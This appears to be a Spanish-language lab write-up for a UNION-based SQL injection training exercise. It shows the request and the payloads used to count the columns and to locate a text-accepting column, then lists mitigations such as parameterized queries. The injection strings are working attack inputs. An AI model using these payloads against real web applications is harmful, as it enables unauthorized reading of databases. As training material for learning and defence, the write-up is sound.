Lab 8

SQL injection UNION attack, finding a column containing text

Información del laboratorio

Nivel: Apprentice

Tipo de SQLi: UNION-based SQL Injection

Objetivo

Hacer que la base de datos devuelva la cadena proporcionada por el laboratorio (xt4HXa) dentro de los resultados de la consulta.

Procedimiento

Paso 1 – Interceptar la petición

GET /filter?category=Pets

Paso 2 – Determinar número de columnas

'+UNION+SELECT+NULL,NULL,NULL--

La respuesta 200 OK indica que existen 3 columnas.

Paso 3 – Identificar columna de texto

'+UNION+SELECT+'xt4HXa',NULL,NULL--

El servidor devuelve error 500, indicando incompatibilidad de tipo.

Paso 4 – Probar siguiente columna

'+UNION+SELECT+NULL,'xt4HXa',NULL--

La respuesta HTTP 200 confirma que la segunda columna acepta texto.

La página muestra el valor xt4HXa, resolviendo el laboratorio.

Mitigación recomendada

  • Uso de consultas parametrizadas.
  • Validación estricta de entradas.
  • Evitar concatenación directa en consultas SQL.
